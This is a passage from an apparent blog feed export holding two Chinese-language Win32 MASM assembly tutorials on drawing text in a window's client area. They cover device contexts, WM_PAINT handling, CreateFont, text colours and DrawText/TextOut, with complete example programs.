    <link href="http://hacktech.cn/2018/02/08/Win32-ASM-5-draw-text.html"/>
    <id>http://hacktech.cn/2018/02/08/Win32-ASM-5-draw-text.html</id>
    <published>2018-02-08T07:55:46.000Z</published>
    <updated>2018-09-08T06:50:11.307Z</updated>
    
    <content type="html"><![CDATA[<p>这次我们将学习有关文本的诸多属性如字体和颜色等。<br><a id="more"></a></p><h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><p>Windows 的颜色系统是用RGB值来表示的，R 代表红色，G 代表绿色，B 代表蓝色。如果您想指定一种颜色就必须给该颜色赋相关的 RGB 值，RGB 的取值范围都是从 0 到 255，譬如您想要得到纯红色，就必须对RGB赋值（255，0，0），纯白色是 （255，255，255）。</p><p>您可以用函数 <code>SetTextColor</code> 和 <code>SetBkColor</code> 来“绘制”字符颜色和背景色，但是必须传递一个“设备环境”的句柄和 RGB 值作为参数。RGB 的结构体的定义如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RGB_value struct</span><br><span class="line">unused db 0</span><br><span class="line">blue db ?</span><br><span class="line">green db ?</span><br><span class="line">red db ?</span><br><span class="line">RGB_value ends</span><br></pre></td></tr></table></figure><p>其中第一字节为 0 而且始终为 0，其它三个字节分别表示蓝色、绿色和红色，刚好和 RGB 的次序相反。这个结构体用起来挺别扭，所以我们重新定义一个宏用它来代替。该宏接收红绿蓝三个参数，并在 eax 寄存器中返回 32 位的 RGB 值，宏的定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RGB macro red，green，blue</span><br><span class="line">xor eax，eax</span><br><span class="line">mov ah，blue</span><br><span class="line">shl eax，8</span><br><span class="line">mov ah，green</span><br><span class="line">mov al，red</span><br><span class="line">endm</span><br></pre></td></tr></table></figure><p>您可以把该宏放到头文件中以方便使用。 </p><p>您可以调用 <code>CreateFont</code> 和 <code>CreateFontIndirect</code> 来创建自己的字体，这两个函数的差别是：前者要求您传递一系列的参数，而后者只要传递一个指向 <code>LOGFONT</code> 结构的指针。这样就使得后者使用起来更方便，尤其当您需要频繁创建字体时。在我们的例子中由于只要创建一种字体，故用 <code>CreateFont</code> 就足够了。在调用该函数后会返回所创建的字体的句柄，然后把该句柄选进“设备环境”使其成为当前字体，随后所有的“绘制”文本串的函数在被调用时都要把该句柄作为一个参数传递 </p><h2 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">includelib user32.lib</span><br><span class="line">include kernel32.inc</span><br><span class="line">includelib kernel32.lib</span><br><span class="line">include gdi32.inc</span><br><span class="line">includelib gdi32.lib</span><br><span class="line"></span><br><span class="line">RGB macro red,green,blue</span><br><span class="line">xor eax,eax</span><br><span class="line">mov ah,blue</span><br><span class="line">shl eax,8</span><br><span class="line">mov ah,green</span><br><span class="line">mov al,red</span><br><span class="line">endm</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;,0</span><br><span class="line">AppName   db &quot;Our Third Window&quot;,0</span><br><span class="line">TestString db &quot;Win32 汇编非常有意思&quot;,0</span><br><span class="line">FontName db &quot;script&quot;,0</span><br><span class="line"></span><br><span class="line">.data?</span><br><span class="line">hInstance HINSTANCE ?</span><br><span class="line">CommandLine LPSTR ?</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">start:</span><br><span class="line">invoke GetModuleHandle,NULL</span><br><span class="line">mov    hInstance,eax</span><br><span class="line">invoke GetCommandLine</span><br><span class="line">mov    CommandLine,eax</span><br><span class="line">invoke WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT</span><br><span class="line">invoke ExitProcess,eax</span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD </span><br><span class="line">    LOCAL wc:WNDCLASSEX </span><br><span class="line">    LOCAL msg:MSG </span><br><span class="line">    LOCAL hwnd:HWND </span><br><span class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX </span><br><span class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </span><br><span class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </span><br><span class="line">    mov   wc.cbClsExtra,NULL </span><br><span class="line">    mov   wc.cbWndExtra,NULL </span><br><span class="line">    push  hInst </span><br><span class="line">    pop   wc.hInstance </span><br><span class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </span><br><span class="line">    mov   wc.lpszMenuName,NULL </span><br><span class="line">    mov   wc.lpszClassName,OFFSET ClassName </span><br><span class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </span><br><span class="line">    mov   wc.hIcon,eax </span><br><span class="line">    mov   wc.hIconSm,eax </span><br><span class="line">    invoke LoadCursor,NULL,IDC_ARROW </span><br><span class="line">    mov   wc.hCursor,eax </span><br><span class="line">    invoke RegisterClassEx, addr wc </span><br><span class="line">    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\ </span><br><span class="line">           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\ </span><br><span class="line">           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\ </span><br><span class="line">           hInst,NULL </span><br><span class="line">    mov   hwnd,eax </span><br><span class="line">    invoke ShowWindow, hwnd,SW_SHOWNORMAL </span><br><span class="line">    invoke UpdateWindow, hwnd </span><br><span class="line">    .WHILE TRUE </span><br><span class="line">        invoke GetMessage, ADDR msg,NULL,0,0 </span><br><span class="line">        .BREAK .IF (!eax) </span><br><span class="line">        invoke TranslateMessage, ADDR msg </span><br><span class="line">        invoke DispatchMessage, ADDR msg </span><br><span class="line">    .ENDW </span><br><span class="line">    mov     eax,msg.wParam </span><br><span class="line">    ret </span><br><span class="line">WinMain endp</span><br><span class="line"></span><br><span class="line">WndProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM</span><br><span class="line">    </span><br><span class="line">    LOCAL hdc:HDC</span><br><span class="line">    LOCAL ps:PAINTSTRUCT</span><br><span class="line">    LOCAL hfont:HFONT</span><br><span class="line">    </span><br><span class="line">    .IF uMsg==WM_DESTROY</span><br><span class="line">        invoke PostQuitMessage,NULL</span><br><span class="line">    .ELSEIF uMsg==WM_PAINT</span><br><span class="line">        invoke BeginPaint,hWnd,ADDR ps</span><br><span class="line">        mov    hdc,eax</span><br><span class="line">        invoke CreateFont,24,16,0,0,400,0,0,0,OEM_CHARSET,\</span><br><span class="line">                            OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,\</span><br><span class="line">                            DEFAULT_QUALITY,DEFAULT_PITCH or FF_SCRIPT,\</span><br><span class="line">                            ADDR FontName </span><br><span class="line">        invoke SelectObject,hdc,eax</span><br><span class="line">        mov    hfont,eax</span><br><span class="line">        RGB    200,200,50</span><br><span class="line">        invoke SetTextColor,hdc,eax</span><br><span class="line">        RGB    0,0,255</span><br><span class="line">        invoke SetBkColor,hdc,eax</span><br><span class="line">        invoke TextOut,hdc,0,0,ADDR TestString,SIZEOF TestString</span><br><span class="line">        invoke SelectObject,hdc,hfont</span><br><span class="line">        invoke EndPaint,hWnd,ADDR ps</span><br><span class="line">    .ELSE</span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam</span><br><span class="line">        ret</span><br><span class="line">    .endif</span><br><span class="line">    xor eax,eax</span><br><span class="line">    ret</span><br><span class="line">WndProc endp</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p><code>CreateFont</code> 函数产生一种逻辑字体，它尽可能地接近参数中指定的各相关值。这个函数大概是所有 Windows API 函数中所带参数最多的一个。它返回一个指向逻辑字体的句柄供调用 <code>SelectObject</code> 函数使用。下面我们详细讲解该函数的参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CreateFont proto \</span><br><span class="line">nHeight：DWORD，\</span><br><span class="line">nWidth：DWORD，\</span><br><span class="line">nEscapement：DWORD，\</span><br><span class="line">nOrientation：DWORD，\</span><br><span class="line">nWeight：DWORD，\ </span><br><span class="line">cItalic：DWORD，\ </span><br><span class="line">cUnderline：DWORD，\</span><br><span class="line">cStrikeOut：DWORD，\</span><br><span class="line">cCharSet：DWORD，\</span><br><span class="line">cOutputPrecision：DWORD，\</span><br><span class="line">cClipPrecision：DWORD，\</span><br><span class="line">cQuality：DWORD，\</span><br><span class="line">cPitchAndFamily：DWORD，\</span><br><span class="line">lpFacename：DWORD</span><br></pre></td></tr></table></figure><ul><li><code>nHeight</code>： 希望使用的字体的高度，0为缺省。</li><li><code>nWidth</code>： 希望使用的字体的宽度，一般情况下最好用0， 这样 Windows 将会自动为您选择一个和高度匹配的值。因为在我们的例子中那样做的话会使得字符因太小而无法显示，所以我们设定它为16。</li><li><code>nEscapement</code>： 每一个字符相对前一个字符的旋转角度，一般设成0。900代表转90度，1800转190度，2700转270度。</li><li><code>nOrientation</code>： 字体的方向。</li><li><code>nWeight</code>： 字体笔画的粗细。</li></ul><p>Windows 为我们预定义了如下值： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">FW_DONTCARE 等于 0</span><br><span class="line">FW_THIN 等于 100</span><br><span class="line">FW_EXTRALIGHT 等于 200</span><br><span class="line">FW_ULTRALIGHT 等于 200</span><br><span class="line">FW_LIGHT 等于 300</span><br><span class="line">FW_NORMAL 等于 400</span><br><span class="line">FW_REGULAR 等于 400</span><br><span class="line">FW_MEDIUM 等于 500</span><br><span class="line">FW_SEMIBOLD 等于 600</span><br><span class="line">FW_DEMIBOLD 等于 600</span><br><span class="line">FW_BOLD 等于 700</span><br><span class="line">FW_EXTRABOLD 等于 800</span><br><span class="line">FW_ULTRABOLD 等于 800</span><br><span class="line">FW_HEAVY 等于 900</span><br><span class="line">FW_BLACK 等于 900</span><br></pre></td></tr></table></figure><ul><li><code>cItalic</code>： 0为正常，其它值为斜体。 </li><li><code>cUnderline</code>： 0为正常，其它值为有下划线。</li><li><code>cStrikeOut</code>： 0为正常，其它值为删除线。</li><li><code>cCharSet</code>： 字体的字符集。一般选择OEM_CHARSET，它使得 Windows 会选用和操作系统相关的字符集。</li><li><code>cOutputPrecision</code>： 指定我们选择的字体接近真实字体的精度。 一般选用OUT_DEFAULT_PRECIS，它决定了缺省的映射方式。</li><li><code>cClipPrecision</code>： 指定我们选择的字体在超出裁剪区域时的裁剪精度。 一般选用CLIP_DEFAULT_PRECIS，它决定了裁剪精度。</li><li><code>cQuality</code>： 指定输出字体的质量。它指出GDI应如何尽可能的接近真实 字体，一共有三种方式：DEFAULT_QUALITY， PROOF_QUALITY 和DRAFT_QUALITY。</li><li><code>cPitchAndFamily</code>：字型和字体家族。</li><li><code>lpFacename</code>： 指定字体的名称。 </li></ul><p>上面的描述不一定好理解，您如果要的到更多的信息，应参考 WIN32 API 指南。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">invoke SelectObject， hdc， eax</span><br><span class="line">mov hfont，eax</span><br></pre></td></tr></table></figure><p>在我们得到了指向逻辑字体的句柄后必须调用 <code>SelectObject</code> 函数把它选择进“设备环境”，我们还可以调用该函数把诸如此类的像颜色、笔、画刷 等GDI对象选进“设备环境”。该函数会返回一个旧的“设备环境”的句柄。您必须保存该句柄，以便在完成“绘制”工作后再把它选回。在调用 <code>SelectObject</code> 函数后一切的绘制函数都是针对该“设备环境”的。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RGB 200，200，50</span><br><span class="line">invoke SetTextColor，hdc，eax</span><br><span class="line">RGB 0，0，255 </span><br><span class="line">invoke SetBkColor，hdc，eax</span><br></pre></td></tr></table></figure><p>我们用宏 RGB 产生颜色，然后分别调用 <code>SetTextColor</code> 和 <code>SetBkColor</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke TextOut，hdc，0，0，ADDR TestString，SIZEOF TestString</span><br></pre></td></tr></table></figure><p>我们调用 <code>TextOut</code> 在客户区用我们前面选定的字体和颜色“绘制”文本串。 <code>TextOut,hdc,x,y,lpString,nCount</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke SelectObject，hdc， hfont</span><br></pre></td></tr></table></figure><p>在我们“绘制”完成后，必须恢复“设备环境”。</p><h2 id="测试图"><a href="#测试图" class="headerlink" title="测试图"></a>测试图</h2><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fo9dl4zzhsj20u00hk0sw.jpg" alt="绘制有颜色的文本"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次我们将学习有关文本的诸多属性如字体和颜色等。&lt;br&gt;
    
    </summary>
    
      <category term="汇编(ASM)" scheme="http://hacktech.cn/categories/%E6%B1%87%E7%BC%96-ASM/"/>
    
    
      <category term="ASM" scheme="http://hacktech.cn/tags/ASM/"/>
    
      <category term="读书笔记" scheme="http://hacktech.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Win32汇编学习(4)：绘制文本</title>
    <link href="http://hacktech.cn/2018/02/07/Win32-ASM-4-draw-text.html"/>
    <id>http://hacktech.cn/2018/02/07/Win32-ASM-4-draw-text.html</id>
    <published>2018-02-07T09:11:25.000Z</published>
    <updated>2018-09-08T06:50:11.307Z</updated>
    
    <content type="html"><![CDATA[<p>这次，我们将学习如何在窗口的客户区“绘制”字符串。我们还将学习关于“设备环境”的概念。<br><a id="more"></a></p><h2 id="理论："><a href="#理论：" class="headerlink" title="理论："></a>理论：</h2><h3 id="“绘制”字符串"><a href="#“绘制”字符串" class="headerlink" title="“绘制”字符串"></a>“绘制”字符串</h3><p>Windows 中的文本是一个GUI（图形用户界面）对象。每一个字符实际上是由许多的像素点组成，这些点在有笔画的地方显示出来，这样就会出现字符。这也是为什么我说“绘制”字符，而不是写字符。通常您都是在您应用程序的客户区“绘制”字符串（尽管您也可以在客户区外“绘制”）。Windows 下的“绘制”字符串方法和 Dos 下的截然不同，在 Dos 下，您可以把屏幕想象成 85 x 25 的一个平面，而 Windows 下由于屏幕上同时有几个应用程序的画面，所以您必须严格遵从规范。Windows 通过把每一个应用程序限制在他的客户区来做到这一点。当然客户区的大小是可变的，您随时可以调整。</p><p>在您在客户区“绘制”字符串前，您必须从 Windows 那里得到您客户区的大小，确实您无法像在 DOS 下那样随心所欲地在屏幕上任何地方“绘制”，绘制前您必须得到 Windows 的允许，然后 Windows 会告诉您客户区的大小，字体，颜色和其它 GUI 对象的属性。您可以用这些来在客户区“绘制”。</p><h3 id="设备环境"><a href="#设备环境" class="headerlink" title="设备环境"></a>设备环境</h3><p>什么是“设备环境”（DC）呢？ 它其实是由 Windows 内部维护的一个数据结构。一个“设备环境”和一个特定的设备相连。像打印机和显示器。对于显示器来说，“设备环境”和一个个特定的窗口相连。</p><p>“设备环境”中的有些属性和绘图有关，像：颜色，字体等。您可以随时改动那些缺省值，之所以保存缺省值是为了方便。您可以把“设备环境”想象成是Windows 为您准备的一个绘图环境，而您可以随时根据需要改变某些缺省属性。</p><p>当应用程序需要绘制时，您必须得到一个“设备环境”的句柄。通常有几种方法。</p><ul><li>在 <code>WM_PAINT</code> 消息中使用 <code>call BeginPaint</code></li><li>在其他消息中使用 <code>call GetDC</code></li><li><code>call CreateDC</code> 建立你自己的 DC</li></ul><p>您必须牢记的是，<strong>在处理单个消息后你必须释放“设备环境”句柄</strong>。不要在一个消息处理中获得 “设备环境”句柄，而在另一个消息处理中在释放它。</p><p>我们在Windows 发送 <code>WM_PAINT</code> 消息时处理绘制客户区，Windows 不会保存客户区的内容，它用的是方法是“重绘”机制（譬如当客户区刚被另一个应用程序的客户区覆盖），Windows 会把 <code>WM_PAINT</code> 消息放入该应用程序的消息队列。重绘窗口的客户区是各个窗口自己的责任，您要做的是在窗口过程处理 WM_PAINT 的部分知道绘制什么和何如绘制。 </p><p>您必须了解的另一个概念是“无效区域”。Windows 把一个最小的需要重绘的正方形区域叫做“无效区域”。当 Windows 发现了一个”无效区域“后，它就会向该应用程序发送一个 <code>WM_PAINT</code> 消息，在 <code>WM_PAINT</code> 的处理过程中，窗口首先得到一个有关绘图的结构体，里面包括无效区的坐标位置等。您可以通过调用 <code>BeginPaint</code> 让“无效区”有效，<strong>如果您不处理 <code>WM_PAINT</code> 消息，至少要调用缺省的窗口处理函数 <code>DefWindowProc</code> ，或者调用 <code>ValidateRect</code> 让“无效区”有效。否则您的应用程序将会收到无穷无尽的 <code>WM_PAINT</code> 消息。</strong></p><p>下面是响应该消息的步骤： </p><ol><li>取得“设备环境”句柄 </li><li>绘制客户区 </li><li>释放“设备环境”句柄 </li></ol><p>注意，您无须显式地让“无效区”有效，这个动作由 <code>BeginPaint</code> 自动完成。您可以在 <code>BeginPaint</code> 和 <code>Endpaint</code> 之间，调用所有的绘制函数。几乎所有的 GDI 函数都需要“设备环境”的句柄作为参数。</p><h2 id="内容："><a href="#内容：" class="headerlink" title="内容："></a>内容：</h2><p>我们将写一个应用程序，它会在客户区的中心显示一行 “Win32 汇编非常有意思”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">option casemap:none </span><br><span class="line"></span><br><span class="line">WinMain proto :DWORD,:DWORD,:DWORD,:DWORD </span><br><span class="line"></span><br><span class="line">include \masm32\include\windows.inc </span><br><span class="line">include \masm32\include\user32.inc </span><br><span class="line">includelib \masm32\lib\user32.lib </span><br><span class="line">include \masm32\include\kernel32.inc </span><br><span class="line">includelib \masm32\lib\kernel32.lib </span><br><span class="line"></span><br><span class="line">.DATA </span><br><span class="line">ClassName db &quot;SimpleWinClass&quot;,0 </span><br><span class="line">AppName  db &quot;Our Second Window&quot;,0 </span><br><span class="line">OurText  db &quot;Win32 汇编非常有意思&quot;,0 </span><br><span class="line"></span><br><span class="line">.DATA? </span><br><span class="line">hInstance HINSTANCE ? </span><br><span class="line">CommandLine LPSTR ? </span><br><span class="line"></span><br><span class="line">.CODE </span><br><span class="line">start: </span><br><span class="line">    invoke GetModuleHandle, NULL </span><br><span class="line">    mov    hInstance,eax </span><br><span class="line">    invoke GetCommandLine</span><br><span class="line">    mov CommandLine,eax</span><br><span class="line">    invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT </span><br><span class="line">    invoke ExitProcess,eax </span><br><span class="line"></span><br><span class="line">WinMain proc hInst:HINSTANCE, hPrevInst:HINSTANCE, CmdLine:LPSTR, CmdShow:DWORD </span><br><span class="line">    LOCAL wc:WNDCLASSEX </span><br><span class="line">    LOCAL msg:MSG </span><br><span class="line">    LOCAL hwnd:HWND </span><br><span class="line">    mov   wc.cbSize,SIZEOF WNDCLASSEX </span><br><span class="line">    mov   wc.style, CS_HREDRAW or CS_VREDRAW </span><br><span class="line">    mov   wc.lpfnWndProc, OFFSET WndProc </span><br><span class="line">    mov   wc.cbClsExtra,NULL </span><br><span class="line">    mov   wc.cbWndExtra,NULL </span><br><span class="line">    push  hInst </span><br><span class="line">    pop   wc.hInstance </span><br><span class="line">    mov   wc.hbrBackground,COLOR_WINDOW+1 </span><br><span class="line">    mov   wc.lpszMenuName,NULL </span><br><span class="line">    mov   wc.lpszClassName,OFFSET ClassName </span><br><span class="line">    invoke LoadIcon,NULL,IDI_APPLICATION </span><br><span class="line">    mov   wc.hIcon,eax </span><br><span class="line">    mov   wc.hIconSm,eax </span><br><span class="line">    invoke LoadCursor,NULL,IDC_ARROW </span><br><span class="line">    mov   wc.hCursor,eax </span><br><span class="line">    invoke RegisterClassEx, addr wc </span><br><span class="line">    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\ </span><br><span class="line">           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\ </span><br><span class="line">           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\ </span><br><span class="line">           hInst,NULL </span><br><span class="line">    mov   hwnd,eax </span><br><span class="line">    invoke ShowWindow, hwnd,SW_SHOWNORMAL </span><br><span class="line">    invoke UpdateWindow, hwnd </span><br><span class="line">        .WHILE TRUE </span><br><span class="line">                invoke GetMessage, ADDR msg,NULL,0,0 </span><br><span class="line">                .BREAK .IF (!eax) </span><br><span class="line">                invoke TranslateMessage, ADDR msg </span><br><span class="line">                invoke DispatchMessage, ADDR msg </span><br><span class="line">        .ENDW </span><br><span class="line">        mov     eax,msg.wParam </span><br><span class="line">        ret </span><br><span class="line">WinMain endp </span><br><span class="line"></span><br><span class="line">WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM </span><br><span class="line">    LOCAL hdc:HDC </span><br><span class="line">    LOCAL ps:PAINTSTRUCT </span><br><span class="line">    LOCAL rect:RECT </span><br><span class="line">    .IF uMsg==WM_DESTROY </span><br><span class="line">        invoke PostQuitMessage,NULL </span><br><span class="line">    .ELSEIF uMsg==WM_PAINT </span><br><span class="line">        invoke BeginPaint,hWnd, ADDR ps </span><br><span class="line">        mov    hdc,eax </span><br><span class="line">        invoke GetClientRect,hWnd, ADDR rect </span><br><span class="line">        invoke DrawText, hdc,ADDR OurText,-1, ADDR rect, \ </span><br><span class="line">                DT_SINGLELINE or DT_CENTER or DT_VCENTER </span><br><span class="line">        invoke EndPaint,hWnd, ADDR ps </span><br><span class="line">    .ELSE </span><br><span class="line">        invoke DefWindowProc,hWnd,uMsg,wParam,lParam </span><br><span class="line">        ret </span><br><span class="line">    .ENDIF </span><br><span class="line">    xor   eax, eax </span><br><span class="line">    ret </span><br><span class="line">WndProc endp </span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>这里的大多数代码和<code>Win32汇编学习(3)：简单的窗口</code>中的一样。我只解释其中一些不相同的地方。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LOCAL hdc：HDC</span><br><span class="line">LOCAL ps：PAINTSTRUCT</span><br><span class="line">LOCAL rect：RECT</span><br></pre></td></tr></table></figure><p>这些局部变量由处理 <code>WM_PAINT</code> 消息中的 GDI 函数调用。<code>hdc</code> 用来存放调用 <code>BeginPaint</code> 返回的“设备环境”句柄。<code>ps</code> 是一个 <code>PAINTSTRUCT</code> 数据类型的变量。通常您不会用到其中的许多值，它由 Windows 传递给 <code>BeginPaint</code>，在结束绘制后再原封不动的传递给 <code>EndPaint</code>。<code>rect</code> 是一个 <code>RECT</code> 结构体类型参数，它的定义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RECT Struct left LONG ?</span><br><span class="line">top LONG ?</span><br><span class="line">right LONG ?</span><br><span class="line">bottom LONG ?</span><br><span class="line">RECT ends</span><br></pre></td></tr></table></figure><p>left 和 top 是正方形左上角的坐标。right 和 bottom 是正方形右下角的坐标。客户区的左上角的坐标是 x=0，y=0，这样对于 x=0，y=10 的坐标点就在它的下面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">invoke BeginPaint，hWnd， ADDR ps</span><br><span class="line">mov hdc，eax</span><br><span class="line">invoke GetClientRect，hWnd， ADDR rect</span><br><span class="line">invoke DrawText， hdc，ADDR OurText，-1， 